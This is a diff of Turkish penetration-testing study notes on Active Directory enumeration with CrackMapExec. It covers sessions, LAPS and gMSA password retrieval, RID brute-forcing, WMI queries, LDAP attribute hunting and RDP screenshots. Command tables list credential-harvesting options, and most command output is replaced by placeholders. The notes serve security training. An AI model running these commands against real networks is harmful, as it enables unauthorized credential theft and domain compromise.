+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |
 
 Daha önce çalışmamış olanları gözden geçirelim:
 
-### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma
 
-Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.
 
 
 ### Sessions ve loggendon-users seçeneklerini kullanma
-![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
 
-Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+{{CODE_BLOCK_126}}
+
+Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.
 
 
 ### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
-![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
-![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+{{CODE_BLOCK_127}}
+
+Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.
+
 
 
 ### Enumerate Computers
 
 CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
 
-
 ### Domain'deki Bilgisayarları Numaralandırma
-![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+{{CODE_BLOCK_128}}
+
 
 Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
 
 
 ### Enumerate LAPS
 
-Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.
 
-![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
 
-![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+{{CODE_BLOCK_129}}
 
-![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
-
-Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
-
+Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.
 
 ### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
 
-Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
 
 
 ### List Local Users
 
-![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
-![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
-![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
-![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
-![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+{{CODE_BLOCK_130}}
 
-Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.
 
-rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
-
+`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
 
 ### Enumerate Disks
 
-Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.
 
 ### Enumerating Disks
-![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+{{CODE_BLOCK_131}}
 
 
 ### Local ve Domain Gruplarını Numaralandırma
-Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.
 
 ### Enumerating Local Groups
-![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
-![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
 
+{{CODE_BLOCK_132}}
 
 ### Enumerating Domain Groups
-![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
-![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
 
-Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+{{CODE_BLOCK_133}}
+
+
+Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.
 
 
 ### Group **Members**
-![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
 
-Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+{{CODE_BLOCK_134}}
+
+Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
 
 
-### Querying WMI
-[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+### WMI Sorgulama
 
-Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
 
-WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.
 
-Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:
 
 
 ### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
-![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
 
-WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+{{CODE_BLOCK_135}}
 
-Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
 
 
 ### Quering root\WMI Namespace
-![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
-![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
 
-Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+{{CODE_BLOCK_136}}
 
-WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.
+
+
 
 Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
 
+----
+
 
 ### LDAP and RDP Enumeration
-Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır
 
 Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
 
-
 ### LDAP & RDP Commands
+
 LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
-![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
-![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
 
-Henüz çalışmadıklarımızı gözden geçirelim.
+| Komut                                                                          | Açıklama                                                                                           |
+| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |
 
+Henüz çalışmadıklarımız varsa onları gözden geçirelim.
 
 ### Enumerating Users and Groups
 
-SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:
 
 ### Enumerating Users and Groups
 
-![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
-![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
-![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
-![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+{{CODE_BLOCK_137}}
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir
 
 
 ### İlginç Hesap Özelliklerini Numaralandırma
 
-ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.
 
-PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
-
-
-### PASSWD_NOTREQD Özniteliğinin Tanımlanması
-
-![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
-![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
-
-TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
-
-### Kısıtlamasız Delegasyonun Belirlenmesi
-![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
-
-adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.
 
 
-### adminCount Özniteliğini Sorgulama
-![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
-![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
-![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+### PASSWD_NOTREQD Attribute Tanımlanması
+
+{{CODE_BLOCK_138}}
+
+`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Unconstrained Delegation Belirlenmesi
+
+{{CODE_BLOCK_139}}
+
+`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.
+
+
+### adminCount Attribute'u Sorgulama
+
+{{CODE_BLOCK_140}}
 
 
 ### Domain SID'sini numaralandırma
 
-Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:
 
+### Domain SID'i Toplama
 
-### Gathering the Domain SID
-
-![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
-![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+{{CODE_BLOCK_141}}
 
 
 ### Group Managed Service Accounts (gMSA)
@@ -8808,138 +9641,158 @@ Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA
 * Basitleştirilmiş service principal name (SPN) yönetimi.
 * Yönetimi diğer yöneticilere devretme yeteneği
 
-Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
 
 Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
 
 Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
 
-
 ### Enumerating Accounts with gMSA Privileges
-![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
-![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
 
-Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+{{CODE_BLOCK_142}}
+
+
+Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.
 
 
 ### gMSA Parolasını Edinme
-![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+{{CODE_BLOCK_143}}
 
 Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
 
-
 ### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
-![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
-![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
 
+{{CODE_BLOCK_144}}
+
+
+---
 
 ### RDP Screenshots
-RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz
 
 
 ### Enumerate Login Prompt
-![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+{{CODE_BLOCK_145}}
 
 Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
 
 
-### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma
+
+{{CODE_BLOCK_146}}
+
 ![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
 
-Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
 
-Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
-
-
-
-### Taking a Screenshot
-![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
-![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
